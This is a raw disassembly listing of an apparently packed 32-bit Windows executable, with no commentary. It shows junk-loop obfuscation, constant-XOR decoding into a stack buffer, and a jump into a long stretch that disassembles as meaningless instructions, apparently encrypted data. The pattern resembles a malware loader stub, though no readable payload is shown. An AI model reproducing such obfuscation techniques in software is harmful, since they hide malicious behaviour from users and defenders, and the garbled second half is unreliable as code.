  40a3c3:	mov    DWORD PTR ds:0x435018,0x19
  40a3cd:	cmp    DWORD PTR ds:0x435018,0x0
  40a3d4:	je     0x40a404
  40a3da:	cmp    DWORD PTR ds:0x435018,0x1b
  40a3e1:	ja     0x40a404
  40a3e7:	jmp    0x40a3f2
  40a3ec:	call   DWORD PTR ds:0x43a8f0
  40a3f2:	mov    esi,DWORD PTR ds:0x435018
  40a3f8:	dec    esi
  40a3f9:	mov    DWORD PTR ds:0x435018,esi
  40a3ff:	jmp    0x40a3cd
  40a404:	mov    esi,0xf89c8585
  40a409:	not    DWORD PTR ds:0x436000
  40a40f:	mov    DWORD PTR [ebp-0x8],esi
  40a412:	mov    DWORD PTR [ebp-0x4],0xf89c8584
  40a419:	push   edi
  40a41a:	mov    eax,eax
  40a41c:	mov    edi,DWORD PTR ds:0x4165b4
  40a422:	mov    ecx,DWORD PTR ds:0x43900c
  40a428:	sub    ecx,edi
  40a42a:	imul   edi,DWORD PTR [edi+ecx*1]
  40a42e:	mov    eax,DWORD PTR [ebp-0x4]
  40a431:	mov    edi,DWORD PTR [ebp-0x8]
  40a434:	mov    ecx,0x751089b
  40a439:	movzx  edx,WORD PTR ds:0x43700c
  40a440:	or     DWORD PTR ds:0x438014,edx
  40a446:	xor    eax,ecx
  40a448:	adc    edx,0x57d4
  40a44e:	xor    edi,ecx
  40a450:	and    edx,0x6c30
  40a456:	mov    edx,0x3272e2
  40a45b:	add    DWORD PTR ds:0x435008,0x434004
  40a465:	add    edi,edx
  40a467:	sub    DWORD PTR ds:0x437008,0x434008
  40a471:	add    eax,edx
  40a473:	imul   eax,edi
  40a476:	mov    DWORD PTR ds:0x436014,edi
  40a47c:	mov    edi,DWORD PTR [ebp+0xc]
  40a47f:	cmp    edi,eax
  40a481:	je     0x40a549
  40a487:	and    eax,0xc4b
  40a48c:	mov    DWORD PTR [ebp-0xc],esi
  40a48f:	mov    esi,DWORD PTR ds:0x416528
  40a495:	mov    esi,DWORD PTR [esi]
  40a497:	sub    DWORD PTR ds:0x437018,esi
  40a49d:	mov    eax,DWORD PTR [ebp-0xc]
  40a4a0:	mov    DWORD PTR ds:0x435004,0x19
  40a4aa:	cmp    DWORD PTR ds:0x435004,0x0
  40a4b1:	je     0x40a500
  40a4b7:	cmp    DWORD PTR ds:0x435004,0x4
  40a4be:	jg     0x40a500
  40a4c4:	jmp    0x40a4d2
  40a4c9:	push   DWORD PTR [ebp-0x28]
  40a4cc:	call   DWORD PTR ds:0x43a8f4
  40a4d2:	cmp    DWORD PTR ds:0x435004,0x5
  40a4d9:	jne    0x40a4ee
  40a4df:	xor    esi,esi
  40a4e1:	or     esi,DWORD PTR ds:0x435004
  40a4e7:	dec    esi
  40a4e8:	mov    DWORD PTR ds:0x435004,esi
  40a4ee:	mov    esi,DWORD PTR ds:0x435004
  40a4f4:	dec    esi
  40a4f5:	mov    DWORD PTR ds:0x435004,esi
  40a4fb:	jmp    0x40a4aa
  40a500:	mov    esi,DWORD PTR [ebp+0xc]
  40a503:	xor    eax,ecx
  40a505:	lea    eax,[eax*8+0x1939788]
  40a50c:	mov    eax,DWORD PTR [esi+eax*1]
  40a50f:	mov    DWORD PTR [ebp+0xc],eax
  40a512:	mov    eax,DWORD PTR [ebp-0x4]
  40a515:	mov    esi,DWORD PTR [ebp-0x8]
  40a518:	xor    eax,ecx
  40a51a:	xor    esi,ecx
  40a51c:	add    esi,edx
  40a51e:	add    eax,edx
  40a520:	imul   eax,esi
  40a523:	mov    esi,DWORD PTR [ebp+0xc]
  40a526:	cmp    esi,eax
  40a528:	je     0x40a549
  40a52e:	mov    eax,DWORD PTR [ebp-0x4]
  40a531:	xor    eax,ecx
  40a533:	mov    ecx,DWORD PTR [ebp+0xc]
  40a536:	add    eax,edx
  40a538:	imul   eax,ecx
  40a53b:	add    eax,DWORD PTR [ebp+0x8]
  40a53e:	mov    DWORD PTR [ebp+0xc],eax
  40a541:	mov    eax,DWORD PTR [ebp+0xc]
  40a544:	jmp    0x40a55a
  40a549:	mov    eax,DWORD PTR [ebp-0x4]
  40a54c:	mov    esi,DWORD PTR [ebp-0x8]
  40a54f:	xor    esi,ecx
  40a551:	xor    eax,ecx
  40a553:	add    esi,edx
  40a555:	add    eax,edx
  40a557:	imul   eax,esi
  40a55a:	pop    edi
  40a55b:	pop    esi
  40a55c:	leave  
  40a55d:	ret    0x8
  40a560:	push   ebp
  40a561:	mov    ebp,esp
  40a563:	push   ecx
  40a564:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  40a56b:	mov    eax,DWORD PTR [ebp-0x4]
  40a56e:	and    DWORD PTR ds:0x434010,0x0
  40a578:	jmp    0x40a58a
  40a57d:	mov    ecx,DWORD PTR ds:0x434010
  40a583:	inc    ecx
  40a584:	mov    DWORD PTR ds:0x434010,ecx
  40a58a:	cmp    DWORD PTR ds:0x434010,0x19
  40a591:	jae    0x40a5d6
  40a597:	cmp    DWORD PTR ds:0x434010,0x9
  40a59e:	jge    0x40a5d6
  40a5a4:	jmp    0x40a5b7
  40a5a9:	push   0x55fe
  40a5ae:	push   DWORD PTR [ebp-0x18]
  40a5b1:	call   DWORD PTR ds:0x43a8f8
  40a5b7:	cmp    DWORD PTR ds:0x434010,0x8
  40a5be:	jne    0x40a5d1
  40a5c4:	mov    ecx,DWORD PTR ds:0x434010
  40a5ca:	inc    ecx
  40a5cb:	mov    DWORD PTR ds:0x434010,ecx
  40a5d1:	jmp    0x40a57d
  40a5d6:	mov    edx,DWORD PTR [ebp+0x10]
  40a5d9:	mov    ecx,0x751089b
  40a5de:	xor    eax,ecx
  40a5e0:	add    eax,0x3272e2
  40a5e5:	mov    DWORD PTR [edx],eax
  40a5e7:	mov    eax,DWORD PTR [ebp+0xc]
  40a5ea:	mov    DWORD PTR ds:0x438008,0x1d
  40a5f4:	cmp    DWORD PTR ds:0x438008,0x0
  40a5fb:	je     0x40a630
  40a601:	cmp    DWORD PTR ds:0x438008,0x1e
  40a608:	jl     0x40a630
  40a60e:	jmp    0x40a61e
  40a613:	push   0x434028
  40a618:	call   DWORD PTR ds:0x43a900
  40a61e:	mov    edx,DWORD PTR ds:0x438008
  40a624:	dec    edx
  40a625:	mov    DWORD PTR ds:0x438008,edx
  40a62b:	jmp    0x40a5f4
  40a630:	xor    eax,ecx
  40a632:	push   esi
  40a633:	mov    esi,DWORD PTR [ebp+0x10]
  40a636:	mov    edx,0x3272e2
  40a63b:	add    eax,edx
  40a63d:	mov    DWORD PTR [esi+0x4],eax
  40a640:	mov    eax,DWORD PTR [ebp+0x14]
  40a643:	mov    esi,DWORD PTR [ebp+0x10]
  40a646:	mov    DWORD PTR [esi+0x8],eax
  40a649:	mov    eax,DWORD PTR [ebp+0x18]
  40a64c:	mov    esi,DWORD PTR [ebp+0x10]
  40a64f:	mov    DWORD PTR [esi+0xc],eax
  40a652:	mov    eax,DWORD PTR [ebp+0x1c]
  40a655:	mov    esi,DWORD PTR [ebp+0x10]
  40a658:	mov    DWORD PTR [esi+0x10],eax
  40a65b:	mov    eax,DWORD PTR [ebp+0x8]
  40a65e:	xor    eax,ecx
  40a660:	add    eax,edx
  40a662:	pop    esi
  40a663:	leave  
  40a664:	ret    0x18
  40a667:	push   ebp
  40a668:	mov    ebp,esp
  40a66a:	sub    esp,0x9c
  40a670:	movzx  ecx,BYTE PTR ds:0x437000
  40a677:	xor    DWORD PTR ds:0x43401c,ecx
  40a67d:	mov    ecx,DWORD PTR [ebp+0x8]
  40a680:	mov    eax,0x8a8d
  40a685:	xor    ax,WORD PTR [ecx+0x20]
  40a689:	mov    ecx,0x3b51
  40a68e:	add    ax,cx
  40a691:	mov    ecx,DWORD PTR ds:0x436014
  40a697:	add    DWORD PTR ds:0x43801c,ecx
  40a69d:	movzx  eax,ax
  40a6a0:	mov    DWORD PTR [ebp-0x10],eax
  40a6a3:	mov    BYTE PTR [ebp-0x1],0x7d
  40a6a7:	sub    DWORD PTR ds:0x434028,edi
  40a6ad:	lea    eax,[ebp-0x1]
  40a6b0:	mov    DWORD PTR [ebp-0xc],eax
  40a6b3:	sub    ecx,0x54f4
  40a6b9:	mov    al,BYTE PTR [ebp-0x1]
  40a6bc:	add    DWORD PTR ds:0x434000,edx
  40a6c2:	mov    ecx,DWORD PTR [ebp-0xc]
  40a6c5:	and    DWORD PTR ds:0x434024,0x436014
  40a6cf:	xor    al,0x74
  40a6d1:	and    DWORD PTR ds:0x436008,0x1db4
  40a6db:	sub    al,0x8
  40a6dd:	or     DWORD PTR ds:0x434014,0x438000
  40a6e7:	mov    BYTE PTR [ecx],al
  40a6e9:	mov    DWORD PTR [ebp-0x18],0xf89c8585
  40a6f0:	and    DWORD PTR ds:0x437014,0x0
  40a6fa:	mov    eax,ds:0x437014
  40a6ff:	inc    eax
  40a700:	mov    ds:0x437014,eax
  40a705:	cmp    DWORD PTR ds:0x437014,0x24
  40a70c:	jl     0x40a72a
  40a712:	jmp    0x40a71d
  40a717:	call   DWORD PTR ds:0x43a904
  40a71d:	cmp    DWORD PTR ds:0x437014,0x1a
  40a724:	jb     0x40a6fa
  40a72a:	push   ebx
  40a72b:	and    DWORD PTR ds:0x43701c,0x0
  40a735:	jmp    0x40a749
  40a73a:	xor    ecx,ecx
  40a73c:	add    ecx,DWORD PTR ds:0x43701c
  40a742:	inc    ecx
  40a743:	mov    DWORD PTR ds:0x43701c,ecx
  40a749:	cmp    DWORD PTR ds:0x43701c,0x1b
  40a750:	jae    0x40a778
  40a756:	cmp    DWORD PTR ds:0x43701c,0x26
  40a75d:	ja     0x40a778
  40a763:	jmp    0x40a773
  40a768:	push   0x78f7
  40a76d:	call   DWORD PTR ds:0x43a8c4
  40a773:	jmp    0x40a73a
  40a778:	mov    DWORD PTR [ebp-0x8],0xf89c8584
  40a77f:	mov    DWORD PTR ds:0x434020,0x16
  40a789:	cmp    DWORD PTR ds:0x434020,0x0
  40a790:	je     0x40a7c3
  40a796:	cmp    DWORD PTR ds:0x434020,0x22
  40a79d:	jbe    0x40a7c3
  40a7a3:	jmp    0x40a7b0
  40a7a8:	push   0x2
  40a7aa:	call   DWORD PTR ds:0x43a8c8
  40a7b0:	xor    eax,eax
  40a7b2:	xor    eax,DWORD PTR ds:0x434020
  40a7b8:	dec    eax
  40a7b9:	mov    ds:0x434020,eax
  40a7be:	jmp    0x40a789
  40a7c3:	mov    ecx,DWORD PTR [ebp-0x18]
  40a7c6:	push   esi
  40a7c7:	and    esi,DWORD PTR ds:0x435010
  40a7cd:	mov    eax,0x751089b
  40a7d2:	xor    ecx,eax
  40a7d4:	mov    DWORD PTR ds:0x435008,0x1d
  40a7de:	cmp    DWORD PTR ds:0x435008,0x0
  40a7e5:	je     0x40a834
  40a7eb:	cmp    DWORD PTR ds:0x435008,0x7
  40a7f2:	jb     0x40a834
  40a7f8:	jmp    0x40a808
  40a7fd:	push   0x43a097
  40a802:	call   DWORD PTR ds:0x43a8d0
  40a808:	cmp    DWORD PTR ds:0x435008,0x8
  40a80f:	jne    0x40a822
  40a815:	mov    esi,DWORD PTR ds:0x435008
  40a81b:	dec    esi
  40a81c:	mov    DWORD PTR ds:0x435008,esi
  40a822:	mov    esi,DWORD PTR ds:0x435008
  40a828:	dec    esi
  40a829:	mov    DWORD PTR ds:0x435008,esi
  40a82f:	jmp    0x40a7de
  40a834:	mov    esi,0x3272e2
  40a839:	sub    DWORD PTR ds:0x43801c,0x434010
  40a843:	push   edi
  40a844:	and    DWORD PTR ds:0x436004,0x69e
  40a84e:	add    ecx,esi
  40a850:	mov    DWORD PTR ds:0x436004,0xf52
  40a85a:	jmp    0x40a87e
  40a85f:	mov    dl,BYTE PTR [ebp-0x1]
  40a862:	mov    DWORD PTR ds:0x43801c,0x56b6
  40a86c:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  40a873:	mov    DWORD PTR ds:0x43701c,0x79a8
  40a87d:	inc    ecx
  40a87e:	cmp    ecx,0x40
  40a881:	mov    DWORD PTR ds:0x437010,0x2279
  40a88b:	jb     0x40a85f
  40a891:	and    DWORD PTR ds:0x43700c,0x0
  40a89b:	xor    edx,edx
  40a89d:	xor    edx,DWORD PTR ds:0x43700c
  40a8a3:	inc    edx
  40a8a4:	mov    DWORD PTR ds:0x43700c,edx
  40a8aa:	cmp    DWORD PTR ds:0x43700c,0x10
  40a8b1:	jbe    0x40a8ee
  40a8b7:	jmp    0x40a8c7
  40a8bc:	push   0x43a0f9
  40a8c1:	call   DWORD PTR ds:0x43a8d4
  40a8c7:	cmp    DWORD PTR ds:0x43700c,0xf
  40a8ce:	jne    0x40a8e1
  40a8d4:	mov    edx,DWORD PTR ds:0x43700c
  40a8da:	inc    edx
  40a8db:	mov    DWORD PTR ds:0x43700c,edx
  40a8e1:	cmp    DWORD PTR ds:0x43700c,0x1d
  40a8e8:	jb     0x40a89b
  40a8ee:	mov    edx,DWORD PTR [ebp-0x18]
  40a8f1:	and    DWORD PTR ds:0x43500c,0x435014
  40a8fb:	xor    edx,eax
  40a8fd:	adc    DWORD PTR ds:0x43700c,0x435014
  40a907:	add    edx,esi
  40a909:	jmp    0x40a9e8
  40a90e:	adc    ecx,edi
  40a910:	mov    edi,DWORD PTR [ebp+0x8]
  40a913:	mov    ecx,DWORD PTR ds:0x435018
  40a919:	sbb    DWORD PTR ds:0x43700c,ecx
  40a91f:	mov    ecx,0x8a8d
  40a924:	or     DWORD PTR ds:0x437014,0x2f73
  40a92e:	xor    cx,WORD PTR [edi+edx*4+0x2]
  40a933:	mov    edi,0x3b51
  40a938:	add    cx,di
  40a93b:	movzx  ecx,cx
  40a93e:	mov    DWORD PTR [ebp-0xc],ecx
  40a941:	and    DWORD PTR ds:0x434008,0x0
  40a94b:	mov    ecx,DWORD PTR ds:0x434008
  40a951:	inc    ecx
  40a952:	mov    DWORD PTR ds:0x434008,ecx
  40a958:	cmp    DWORD PTR ds:0x434008,0x6
  40a95f:	jg     0x40a99a
  40a965:	jmp    0x40a973
  40a96a:	push   DWORD PTR [ebp-0x20]
  40a96d:	call   DWORD PTR ds:0x43a8dc
  40a973:	cmp    DWORD PTR ds:0x434008,0x5
  40a97a:	jne    0x40a98d
  40a980:	mov    ecx,DWORD PTR ds:0x434008
  40a986:	inc    ecx
  40a987:	mov    DWORD PTR ds:0x434008,ecx
  40a98d:	cmp    DWORD PTR ds:0x434008,0x19
  40a994:	jb     0x40a94b
  40a99a:	mov    ecx,DWORD PTR [ebp+0x8]
  40a99d:	adc    DWORD PTR ds:0x437010,0x435000
  40a9a7:	movzx  ecx,WORD PTR [ecx+edx*4]
  40a9ab:	inc    DWORD PTR ds:0x437018
  40a9b1:	xor    ecx,0x8a8d
  40a9b7:	or     DWORD PTR ds:0x43701c,0x43800c
  40a9c1:	add    ecx,edi
  40a9c3:	mov    DWORD PTR ds:0x434004,ecx
  40a9c9:	mov    edi,DWORD PTR [ebp-0xc]
  40a9cc:	mov    DWORD PTR ds:0x435018,0x55c8
  40a9d6:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  40a9dd:	mov    DWORD PTR ds:0x43401c,0x7075
  40a9e7:	inc    edx
  40a9e8:	mov    ecx,DWORD PTR [ebp-0x10]
  40a9eb:	mov    DWORD PTR ds:0x437004,0x237b
  40a9f5:	cmp    edx,ecx
  40a9f7:	jne    0x40a90e
  40a9fd:	inc    ecx
  40a9fe:	mov    ecx,DWORD PTR [ebp-0x18]
  40aa01:	mov    DWORD PTR ds:0x43600c,0x12
  40aa0b:	cmp    DWORD PTR ds:0x43600c,0x0
  40aa12:	je     0x40aa56
  40aa18:	cmp    DWORD PTR ds:0x43600c,0x17
  40aa1f:	ja     0x40aa56
  40aa25:	jmp    0x40aa44
  40aa2a:	push   0x43a000
  40aa2f:	push   0x6abf
  40aa34:	push   0x7f73
  40aa39:	push   0x6111
  40aa3e:	call   DWORD PTR ds:0x43a8e0
  40aa44:	mov    edi,DWORD PTR ds:0x43600c
  40aa4a:	dec    edi
  40aa4b:	mov    DWORD PTR ds:0x43600c,edi
  40aa51:	jmp    0x40aa0b
  40aa56:	mov    edx,DWORD PTR [ebp+0x10]
  40aa59:	xor    ecx,eax
  40aa5b:	dec    edi
  40aa5c:	add    ecx,esi
  40aa5e:	add    edi,0x5bbd
  40aa64:	mov    DWORD PTR [edx],ecx
  40aa66:	xor    ecx,ecx
  40aa68:	or     ecx,DWORD PTR ds:0x439004
  40aa6e:	mov    edi,DWORD PTR ds:0x43901c
  40aa74:	sub    ecx,edi
  40aa76:	or     ecx,DWORD PTR [ecx+edi*1]
  40aa79:	mov    ecx,DWORD PTR [ebp-0x18]
  40aa7c:	sub    DWORD PTR ds:0x43400c,ecx
  40aa82:	xor    ecx,eax
  40aa84:	add    edi,DWORD PTR ds:0x436014
  40aa8a:	add    ecx,esi
  40aa8c:	or     DWORD PTR ds:0x43401c,0x72a8
  40aa96:	mov    DWORD PTR [ebp-0xc],ecx
  40aa99:	mov    DWORD PTR [ebp+0x8],0xf89c8585
  40aaa0:	and    DWORD PTR ds:0x434018,edi
  40aaa6:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  40aaad:	or     DWORD PTR ds:0x434024,0x436008
  40aab7:	mov    DWORD PTR [ebp-0x10],0xf89c9585
  40aabe:	and    DWORD PTR ds:0x436004,0x0
  40aac8:	mov    ecx,DWORD PTR ds:0x436004
  40aace:	inc    ecx
  40aacf:	mov    DWORD PTR ds:0x436004,ecx
  40aad5:	cmp    DWORD PTR ds:0x436004,0x1e
  40aadc:	ja     0x40ab14
  40aae2:	jmp    0x40ab07
  40aae7:	push   DWORD PTR [ebp-0x24]
  40aaea:	push   0x43401c
  40aaef:	push   DWORD PTR [ebp-0x20]
  40aaf2:	push   0x43a07b
  40aaf7:	push   0x8e91
  40aafc:	push   0x3182
  40ab01:	call   DWORD PTR ds:0x43a8e4
  40ab07:	cmp    DWORD PTR ds:0x436004,0x1b
  40ab0e:	jb     0x40aac8
  40ab14:	mov    ecx,DWORD PTR [ebp-0x14]
  40ab17:	mov    edi,DWORD PTR ds:0x416528
  40ab1d:	mov    edi,DWORD PTR [edi]
  40ab1f:	xor    DWORD PTR ds:0x434024,edi
  40ab25:	mov    DWORD PTR [ebp+0x8],ecx
  40ab28:	or     DWORD PTR ds:0x43600c,0x6978
  40ab32:	mov    ecx,DWORD PTR [ebp+0x8]
  40ab35:	xor    ecx,eax
  40ab37:	add    ecx,esi
  40ab39:	mov    ecx,0x242ebe9
  40ab3e:	mov    edi,0x3d76
  40ab43:	mov    edi,0xf641bea
  40ab48:	je     0x4163dd
  40ab4e:	mov    edx,DWORD PTR [ebp+0x8]
  40ab51:	mov    ebx,DWORD PTR [ebp-0x8]
  40ab54:	xor    edx,eax
  40ab56:	or     DWORD PTR ds:0x434020,0x43801c
  40ab60:	xor    ebx,eax
  40ab62:	sbb    DWORD PTR ds:0x434014,0x391d
  40ab6c:	sub    edx,ebx
  40ab6e:	and    DWORD PTR ds:0x43700c,0x5ff0
  40ab78:	sub    edx,esi
  40ab7a:	neg    ebx
  40ab7c:	xor    edx,eax
  40ab7e:	or     ebx,DWORD PTR ds:0x435018
  40ab84:	mov    DWORD PTR [ebp+0x8],edx
  40ab87:	dec    DWORD PTR ds:0x435004
  40ab8d:	mov    edx,DWORD PTR [ebp+0x8]
  40ab90:	mov    ebx,DWORD PTR [ebp-0x58]
  40ab93:	add    edx,0x5708c4
  40ab99:	imul   edx,ebx
  40ab9c:	mov    DWORD PTR [ebp-0x58],edx
  40ab9f:	mov    edx,DWORD PTR [ebp+0x8]
  40aba2:	mov    ebx,DWORD PTR [ebp-0x54]
  40aba5:	sub    DWORD PTR ds:0x434000,0x43800c
  40abaf:	add    edx,0x64f8da
  40abb5:	or     edx,ebx
  40abb7:	or     DWORD PTR ds:0x43600c,ebx
  40abbd:	mov    DWORD PTR [ebp-0x54],edx
  40abc0:	mov    edx,DWORD PTR [ebp+0x8]
  40abc3:	mov    ebx,DWORD PTR [ebp-0x50]
  40abc6:	jmp    0x40cf7a
  40abcb:	mov    ebp,0x9391ee60
  40abd0:	xchg   ebx,eax
  40abd1:	mov    ds:0x46f90650,eax
  40abd6:	mov    DWORD PTR [esi],0xe7dcc97
  40abdc:	push   es
  40abdd:	jl     0x40ac5b
  40abdf:	jmp    0x40ac40
  40abe1:	jl     0x40ac5f
  40abe3:	fstp   TBYTE PTR [ecx+0xc834343]
  40abe9:	popf   
  40abea:	loopne 0x40abac
  40abec:	mov    eax,ds:0x2e54608a
  40abf1:	jne    0x40ac32
  40abf3:	xchg   edx,eax
  40abf4:	sbb    dl,BYTE PTR [ebp+0x98f336a]
  40abfa:	mov    edx,DWORD PTR [ecx+0x1d]
  40abfd:	mov    edi,0xbe49a267
  40ac02:	or     cl,BYTE PTR [ebp+0x5d]
  40ac05:	adc    BYTE PTR [ecx-0x2b],dh
  40ac08:	xor    esp,DWORD PTR [ebx+0x13f9bd82]
  40ac0e:	mov    dl,0x64
  40ac10:	mov    esp,0x5c1514da
  40ac15:	add    DWORD PTR [ebx+0x1b],eax
  40ac18:	push   ebp
  40ac19:	xchg   ebp,eax
  40ac1a:	xor    eax,0x85a38684
  40ac1f:	test   DWORD PTR ds:0x4c9bf2ac,edx
  40ac25:	pop    edi
  40ac26:	mov    eax,0x3c1440cc
  40ac2b:	aas    
  40ac2c:	xchg   edi,eax
  40ac2d:	gs cmp al,0x62
  40ac30:	(bad)  
  40ac31:	(bad)  
  40ac32:	dec    esp
  40ac33:	ror    DWORD PTR [ecx],1
  40ac35:	push   0xf0ee9723
  40ac3a:	shr    DWORD PTR [esi+ecx*4-0x60],1
  40ac3e:	push   ds
  40ac3f:	sbb    DWORD PTR [ebx-0x25],ebx
  40ac42:	ret    
  40ac43:	mov    bl,0x2b
  40ac45:	push   es
  40ac46:	pop    DWORD PTR [edi+0x65]
  40ac49:	cld    
  40ac4a:	pop    edx
  40ac4b:	sub    DWORD PTR [ecx+0x5c],esi
  40ac4e:	in     al,dx
  40ac4f:	push   ebp
  40ac50:	sar    ebp,cl
  40ac52:	dec    ebp
  40ac53:	outs   dx,DWORD PTR ds:[esi]
  40ac54:	jb     0x40acc8
  40ac56:	mov    bl,bl
  40ac58:	sub    BYTE PTR [eax+0x73],bh
  40ac5b:	(bad)  
  40ac5c:	mov    dl,0x62
  40ac5e:	mov    bh,0x45
  40ac60:	lahf   
  40ac61:	mov    ds:0xde19460d,al
  40ac66:	ret    0x7a57
  40ac69:	xchg   ebp,eax
  40ac6a:	in     eax,0xfd
  40ac6c:	rol    BYTE PTR [ebx+0x7c398a68],0x44
  40ac73:	fmul   DWORD PTR [eax-0x56]
  40ac76:	jp     0x40acdf
  40ac78:	ret    0xf1fc
  40ac7b:	jle    0x40acc7
  40ac7d:	test   DWORD PTR [esi],esi
  40ac7f:	xchg   ebp,eax
  40ac80:	and    BYTE PTR [esi+0x63a4476a],ah
  40ac86:	xchg   bl,dh
  40ac88:	out    0xda,al
  40ac8a:	xchg   ebp,eax
  40ac8b:	ror    DWORD PTR [esi-0x1b672e93],0xc7
  40ac92:	fwait
  40ac93:	scas   al,BYTE PTR es:[edi]
  40ac94:	je     0x40ac70
  40ac96:	mov    ebx,0x7c6502af
  40ac9b:	dec    ecx
  40ac9c:	mov    bh,0x37
  40ac9e:	mov    DWORD PTR ds:0x30073cf6,edi
  40aca4:	jae    0x40ad1f
  40aca6:	jge    0x40acf8
  40aca8:	jecxz  0x40acb6
  40acaa:	xor    eax,0xc99d2bda
  40acaf:	addr16 inc ecx
  40acb1:	cwde   
  40acb2:	daa    
  40acb3:	outs   dx,DWORD PTR ds:[esi]
  40acb4:	hlt    
  40acb5:	dec    ebp
  40acb6:	jle    0x40ac8a
  40acb8:	push   es
  40acb9:	jnp    0x40acc8
  40acbb:	enter  0x822d,0x46
  40acbf:	or     ch,BYTE PTR [ebp+0x29b230a3]
  40acc5:	repz (bad) 
  40acc7:	popf   
  40acc8:	fdivr  QWORD PTR [ebp+0x25407ca1]
  40acce:	mov    ds:0x17fc190a,eax
  40acd3:	mov    al,ds:0x98e1bbf0
  40acd8:	aam    0xb5
  40acda:	lods   al,BYTE PTR ds:[esi]
  40acdb:	lahf   
  40acdc:	into   
  40acdd:	cmp    ebp,esi
  40acdf:	pop    es
  40ace0:	repz (bad) 
  40ace2:	sbb    ebp,DWORD PTR [esi+0x7b133102]
  40ace8:	sbb    eax,0xe80854cc
  40aced:	add    esi,ebp
  40acef:	push   eax
  40acf0:	out    dx,eax
  40acf1:	lock jge 0x40ad61
  40acf4:	rol    DWORD PTR [ebx],1
  40acf6:	xor    BYTE PTR [ecx-0xff2f08f],bl
  40acfc:	mov    eax,0xbf32161c
  40ad01:	test   DWORD PTR [ecx-0x4e],edx
  40ad04:	cli    
  40ad05:	push   ss
  40ad06:	ins    DWORD PTR es:[edi],dx
  40ad07:	sbb    al,0xb1
  40ad09:	mov    al,0x81
  40ad0b:	push   ecx
  40ad0c:	adc    DWORD PTR [edx+0x6b35271e],0x9b4978d8
  40ad16:	(bad)  
  40ad17:	xchg   edx,eax
  40ad18:	or     BYTE PTR [ebp+0x66d077bb],cl
  40ad1e:	pusha  
  40ad1f:	aaa    
  40ad20:	lahf   
  40ad21:	dec    edx
  40ad22:	inc    ebx
  40ad23:	(bad)  
  40ad24:	cmp    DWORD PTR [ebx+edi*1-0x78],esi
  40ad28:	shr    BYTE PTR [edi-0x77],1
  40ad2b:	push   cs
  40ad2c:	sbb    edi,ebp
  40ad2e:	lds    esp,FWORD PTR [ecx]
  40ad30:	cmp    BYTE PTR [edx],ah
  40ad32:	mov    ecx,0x95853989
  40ad37:	loopne 0x40ad14
  40ad39:	xlat   BYTE PTR ds:[ebx]
  40ad3a:	push   ss
  40ad3b:	gs ins BYTE PTR es:[edi],dx
  40ad3d:	ds inc ebp
  40ad3f:	pusha  
  40ad40:	aas    
  40ad41:	call   FWORD PTR [edi+0x62d605b6]
  40ad47:	mov    es,WORD PTR [edi]
  40ad49:	mov    ah,0x30
  40ad4b:	in     al,0x7b
  40ad4d:	or     eax,0xa3c89e9e
  40ad52:	out    dx,al
  40ad53:	hlt    
  40ad54:	mov    ds:0xeb119c84,al
  40ad59:	push   ss
  40ad5a:	jb     0x40ad86
  40ad5c:	loopne 0x40ad37
  40ad5e:	adc    eax,0xba79a9fb
  40ad63:	ja     0x40adaa
  40ad65:	xchg   BYTE PTR [ebp-0x70],dh
  40ad68:	test   eax,0xe3a37b0b
  40ad6d:	scas   al,BYTE PTR es:[edi]
  40ad6e:	push   es
  40ad6f:	and    BYTE PTR [ebp+0x27],0xe3
  40ad73:	jb     0x40ada5
  40ad75:	sbb    esi,DWORD PTR [ebx-0x80]
  40ad78:	std    
  40ad79:	push   eax
  40ad7a:	jnp    0x40ad26
  40ad7c:	bound  edi,QWORD PTR [edx+eax*1+0x4f]
  40ad80:	and    al,0x94
  40ad82:	mov    ah,0x3c
  40ad84:	lea    ebx,[esi+0x1]
  40ad87:	pushf  
  40ad88:	aaa    
  40ad89:	dec    edx
  40ad8a:	jg     0x40ad90
  40ad8c:	sbb    dl,BYTE PTR [ecx+0x40]
  40ad8f:	mov    esi,0x9ef55c32
  40ad94:	cld    
  40ad95:	inc    ebp
  40ad96:	mov    bh,0x4
  40ad98:	test   BYTE PTR [ebx-0x41],bl
  40ad9b:	inc    edx
  40ad9c:	mov    ds:0x5e1d4a71,eax
  40ada1:	in     eax,dx
  40ada2:	in     eax,0x95
  40ada4:	xor    al,0xb4
  40ada6:	and    al,BYTE PTR [eax+0x9]
  40ada9:	and    esi,esi
  40adab:	pop    ebx
  40adac:	mov    al,0x82
  40adae:	pop    esi
  40adaf:	retf   0xe295
  40adb2:	arpl   WORD PTR ds:0xa692440b,si
  40adb8:	mov    fs,WORD PTR [edx+0x3]
  40adbb:	push   ds
  40adbc:	sbb    eax,0x3e943a93
  40adc1:	(bad)  [edx-0x1c]
  40adc4:	xor    al,0x21
  40adc6:	mov    al,ds:0xe55bbdc0
  40adcb:	loope  0x40ad63
  40adcd:	stc    
  40adce:	aad    0x10
  40add0:	rcr    BYTE PTR [edi+0x68a23d29],1
  40add6:	xor    BYTE PTR [eax+0x491b5374],ah
  40addc:	lea    eax,[edx-0x55fb3db]
  40ade2:	dec    ax
  40ade4:	mov    BYTE PTR [edx-0x71],0xaa
  40ade8:	lds    eax,FWORD PTR ds:0x85f65b52
  40adee:	and    DWORD PTR [ebx-0x42],esi
  40adf1:	mov    bh,bh
  40adf3:	inc    esi
  40adf4:	mov    DWORD PTR [ebx],ebp
  40adf6:	in     eax,dx
  40adf7:	pushf  
  40adf8:	imul   ebx,DWORD PTR [esi],0x2d
  40adfb:	int3   
  40adfc:	cs dec ebx
  40adfe:	xor    eax,0xbadf7056
  40ae03:	ja     0x40adb3
  40ae05:	sbb    DWORD PTR [eax-0x44d37c14],edx
  40ae0b:	mov    al,0x78
  40ae0d:	daa    
  40ae0e:	icebp  
  40ae0f:	xchg   bl,dl
  40ae11:	jo     0x40ae86
  40ae13:	xor    ecx,DWORD PTR [edi-0x2bdc406c]
  40ae19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae1a:	and    bh,BYTE PTR [ecx+0x490be86f]
  40ae20:	push   0x7
  40ae22:	neg    esi
  40ae24:	sub    al,0x49
  40ae26:	cmp    esi,DWORD PTR [ebx+0x47]
  40ae29:	mov    cl,BYTE PTR [edi+eax*8-0x3f]
  40ae2d:	mov    WORD PTR [eax-0x41],es
  40ae30:	jmp    0xaea30c63
  40ae35:	cwde   
  40ae36:	test   BYTE PTR [esi+0x71009db9],cl
  40ae3c:	das    
  40ae3d:	xor    ebx,DWORD PTR [ecx]
